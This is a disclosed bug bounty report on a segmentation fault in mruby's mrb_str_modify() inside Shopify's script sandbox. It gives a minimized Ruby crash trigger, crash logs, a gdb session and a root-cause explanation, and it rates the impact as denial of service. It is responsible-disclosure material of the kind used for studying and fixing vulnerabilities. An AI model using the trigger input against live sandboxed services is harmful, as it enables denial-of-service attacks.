# SIGSEGV on mruby mrb_str_modify() (Invalid memory access)

## Report Details
- **Report ID**: 183231
- **URL**: https://hackerone.com/reports/183231
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-18T03:48:21.522Z
- **Disclosed**: 2016-12-17T02:30:01.984Z

## Reporter
- **Username**: jpenalbae
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
There is an invalid memory read on mruby when calling to `mrb_str_modify()` with a invalid `RString *` which causes a SIGSEGV and leads to denial of service.

## Sample

The following code triggers the bug (attached as mrb_str_modify.min.rb):
```ruby
def n
if $0
end
""if 00end
qqq=Proc.new{|*x|x.join}
qqq.("",<<000,"",
000
"")
qqq.("","#{<<000}",
000
"")
0[<<0000,
#{<<0000}
0000
0000
0]
```

## Crash
Here we can see the crash (full crash output attached)
```
$ bin/sandbox /tmp/mrb_str_modify.min.rb
bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001
ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:000518 EVAL   bin/sandbox:21 [FINISH]
c:0001 p:0000 s:0002 E:000730 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:21:in `<main>'
bin/sandbox:21:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007f423c11d17b RBP: 0x00007f423ac954e0 RSP: 0x00007f423ac93a80
 RAX: 0x0000000000000002 RBX: 0x0000000000000001 RCX: 0x00007f423aca7b00
 RDX: 0x00007f423ac9cf80 RDI: 0x00007f423ac954e0 RSI: 0x0000000000000001
  R8: 0x00007f423ac953e0  R9: 0x00007f423acbc6a0 R10: 0x0000000000000330
 R11: 0x00007f423c11e670 R12: 0x00007f423ac954e0 R13: 0x00007f423ac9cf80
 R14: 0x00007f423ac954e0 R15: 0x000000000100c03e EFL: 0x0000000000010202

-- C level backtrace information -------------------------------------------
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042dea5]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042e0dc]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f4240308364]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f42403b9dbe]
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f424008ced0]
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_modify+0xb) [0x7f423c11d17b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:659
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_concat+0x18) [0x7f423c11e688] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2243) [0x7f423c12e7d3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f423c132567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f423c106173] ../../../../ext/mruby_engine/eval_monitored.c:68
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f4240083464]
/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f423f3ff30d]
```


## Crash debug

```
(gdb) r
Starting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mrb_str_modify.min.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7ff5700 (LWP 30942)]
[New Thread 0x7ffff2348700 (LWP 30993)]

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2348700 (LWP 30993)]
mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660
660       check_frozen(mrb, s);
(gdb) x/1i $rip
=> 0x7ffff37d117b <mrb_str_modify+11>:  mov    eax,DWORD PTR [rsi]
(gdb) i r rsi
rsi            0x1      1
(gdb) print (mrb_value)$rsi
$1 = {
  value = {
    p = 0x1,
    {
      i_flag = 1,
      i = 0
    },
    {
      sym_flag = 1,
      sym = 0
    },
    bp = 0x1,
    fp = 0x1,
    vp = 0x1
  },
  w = 1
}
(gdb) list *$rip
0x7ffff37d117b is in mrb_str_modify (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:504).
499     }
500
501     static void
502     check_frozen(mrb_state *mrb, struct RString *s)
503     {
504       if (RSTR_FROZEN_P(s)) {
505         mrb_raise(mrb, E_RUNTIME_ERROR, "can't modify frozen string");
506       }
507     }
508
(gdb)
```

Backtrace
```
(gdb) bt
#0  mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660
#1  0x00007ffff37d2688 in mrb_str_concat (mrb=mrb@entry=0x7ffff23494e0, self=..., other=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758
#2  0x00007ffff37e27d3 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351310, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219
#3  0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351310, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#4  0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
#5  0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333
#6  0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
```

The crash happens at `mruby-engine/ext/mruby_engine/mruby/src/string.c:504` which is built inline
```c
static void
check_frozen(mrb_state *mrb, struct RString *s)
{
  if (RSTR_FROZEN_P(s)) {   // <-- Bug happens here
    mrb_raise(mrb, E_RUNTIME_ERROR, "can't modify frozen string");
  }
}
```

Actually `mrb_str_concat()` performs a cast of the argument `mrb_value self` to a `RString *` pointer, this generates an invalid pointer which is passed to `mrb_str_modify()` and later on to `check_frozen()` which tries to read from it and produces the crash.

## Impact
Its impact seems to be DoS of the service running the sandbox service. I doubt this would be exploitable, but I have seen the memory address being read change in between samples. If an attacker would be able to control this value it could lead to a write-what-where type vulnerability. But I highly doubt this would be possible to control.

Samples generating different invalid addresses have been attached.
```
$ bin/sandbox /tmp/mrb_str_modify.rb 2>&1 | head -1
bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000003
$ bin/sandbox /tmp/mrb_str_modify.min.rb 2>&1 | head -1
bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001
```

## Attachments
- mrb_str_modify.min.rb
- mrb_str_modify.rb
- mrb_str_modify.crash.log
